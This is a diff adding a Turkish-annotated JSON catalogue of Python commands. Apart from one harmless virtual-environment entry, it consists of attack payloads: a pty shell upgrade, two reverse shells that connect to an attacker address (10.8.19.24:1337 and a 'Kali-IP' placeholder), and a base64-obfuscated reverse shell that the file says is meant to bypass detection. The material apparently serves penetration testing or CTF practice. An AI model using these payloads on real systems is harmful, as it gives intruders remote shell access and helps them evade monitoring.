@@ -1,0 +1,49 @@
+{
+    "venv": {
+        "desc": "Python sanal ortam oluşturma ve yönetimi",
+        "command": "python3 -m venv my_env",
+        "usage": "Python projelerinde bağımsız paket ortamları oluşturmak için kullanılır",
+        "examples": [
+            "python3 -m venv my_env",
+            "source my_env/bin/activate",
+            "pip install paket_adı"
+        ],
+        "category": "python_environment"
+    },
+    "pty_spawn": {
+        "desc": "Python ile interaktif shell başlatma",
+        "command": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
+        "usage": "Kısıtlı shell ortamlarında tam interaktif shell elde etmek için",
+        "category": "shell_upgrade",
+        "type": "privilege_escalation"
+    },
+    "reverse_shell_socket": {
+        "desc": "Python socket ile reverse shell bağlantısı",
+        "command": "import socket, subprocess, os; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\"10.8.19.24\", 1337)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); subprocess.call([\"/bin/sh\", \"-i\"])",
+        "usage": "Hedef sistemden saldırgan makineye reverse shell bağlantısı kurmak için",
+        "parameters": {
+            "ip": "Saldırgan IP adresi",
+            "port": "Dinleme portu"
+        },
+        "category": "reverse_shell",
+        "type": "penetration_testing",
+        "security": "high_risk"
+    },
+    "reverse_shell_pty": {
+        "desc": "PTY destekli Python reverse shell",
+        "command": "python -c 'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"Kali-IP\",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'",
+        "usage": "Tam interaktif reverse shell bağlantısı kurmak için",
+        "category": "reverse_shell",
+        "type": "penetration_testing",
+        "security": "high_risk"
+    },
+    "base64_reverse_shell": {
+        "desc": "Base64 kodlanmış Python reverse shell",
+        "command": "python3 -c 'import base64;exec(base64.b64decode(\"aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjguMTkuMjQiLDEzMzcpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7aW1wb3J0IHB0eTsgcHR5LnNwYXduKCIvYmluL3NoIikK\").decode())'",
+        "usage": "Tespit edilmesi zor base64 kodlanmış reverse shell",
+        "category": "reverse_shell",
+        "type": "evasion",
+        "security": "high_risk",
+        "note": "Base64 kodlama ile basic detection bypass"
+    }
+}
